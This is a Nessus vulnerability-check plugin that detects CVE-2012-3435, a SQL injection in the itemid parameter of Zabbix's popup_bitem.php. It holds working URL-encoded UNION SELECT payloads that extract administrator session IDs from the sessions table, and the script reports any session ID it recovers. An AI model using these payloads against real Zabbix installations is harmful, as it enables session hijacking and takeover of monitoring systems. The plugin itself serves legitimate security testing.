#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(62757);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2016/05/20 14:30:35 $");

  script_cve_id("CVE-2012-3435");
  script_bugtraq_id(54661);
  script_osvdb_id(84127);
  script_xref(name:"EDB-ID", value:"20087");

  script_name(english:"Zabbix Web Interface popup_bitem.php itemid Parameter SQL Injection");
  script_summary(english:"Tries to gather session id from the database");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP application that is prone to a SQL
injection attack.");
  script_set_attribute(attribute:"description", value:
"The remote web server hosts a version of the Zabbix web interface that
is affected by a SQL injection vulnerability.  The vulnerability exists
in the 'popup_bitem.php' script, which fails to properly sanitize
user-supplied input to the 'itemid' parameter before using it in
database queries.  This could allow an attacker to manipulate such
queries, resulting in manipulation or disclosure of arbitrary data.");
  script_set_attribute(attribute:"see_also", value:"https://support.zabbix.com/browse/ZBX-5348");
  script_set_attribute(attribute:"see_also", value:"http://www.zabbix.com/rn1.8.15rc1.php");
  script_set_attribute(attribute:"see_also", value:"http://www.zabbix.com/rn2.0.2rc1.php");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 1.8.15rc1 / 2.02rc1 / 2.1.0 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Zabbix 2.0 SQL Injection");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/07/18");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/07/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/10/30");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:zabbix:zabbix");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2016 Tenable Network Security, Inc.");

  script_dependencies("zabbix_frontend_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/zabbix");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("webapp_func.inc");
include("http.inc");
include("url_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(
  appname:"zabbix",
  port:port,
  exit_on_fail:TRUE
);

dir = install["dir"];
loc = build_url(port:port, qs:dir);

session = NULL;

sql_attack = make_list(
  # 2.0.x branch
  "1+union+select+1%2C1%2C1%2C1%2C1%2Cgroup_concat%28sessionid%29%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1+from+sessions+where+userid%3D%271%27%23&dstfrm=1",
  # 1.8.x branch
  "1+union+select+1%2C1%2C1%2C1%2C1%2C1%2Cgroup_concat%28sessionid%29%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1+from+sessions+where+userid%3D%271%27%23&dstfrm=1"
);

pat1 = 'name="caption" value="(.+)" size=|id="caption" type="text" size="32" value="(.+)" />';
pat2 = '(name="caption"|size="[0-9]+") value="([A-Za-z0-9,]+)" (size=|/></td>)';

foreach sqli (sql_attack)
{
  url = "/popup_bitem.php?itemid=" + sqli;

  res = http_send_recv3(
    port         : port,
    method       : "GET",
    item         : dir + url,
    exit_on_fail : TRUE
  );

  if (
    '<title>Graph item</title>' >< res[2] &&
    (
      '<meta name="Author" content="Zabbix SIA"' >< res[2] ||
      '<meta name="Author" content="ZABBIX SIA"' >< res[2]
    )
  )
  {
    matches = egrep(pattern:pat1, string:res[2]);
    if (matches)
    {
      foreach match (split(matches, keep:FALSE))
      {
	item = eregmatch(pattern:pat2, string:match);
        if (!isnull(item))
        {
          session = item[2];
          break;
        }
      }
    }
  }
  # No need to try alternate SQL statement if we succeed the first time
  if (session != NULL) break;
}
# Exit if we did not obtain a session using our SQLi attack
if (session == NULL) audit(AUDIT_WEB_APP_NOT_AFFECTED, "Zabbix", loc);

set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);
if (report_verbosity > 0)
{
  report =
    '\nNessus was able to verify the issue exists using the following request :' +
    '\n' +
    '\n' + loc + url +
    '\n';

  if (report_verbosity >1)
  {
    report +=
      '\n' + "This produced the following session id : " + session +
      '\n';
  }
  security_hole(port:port, extra:report);
  exit(0);
}
else security_hole(port);
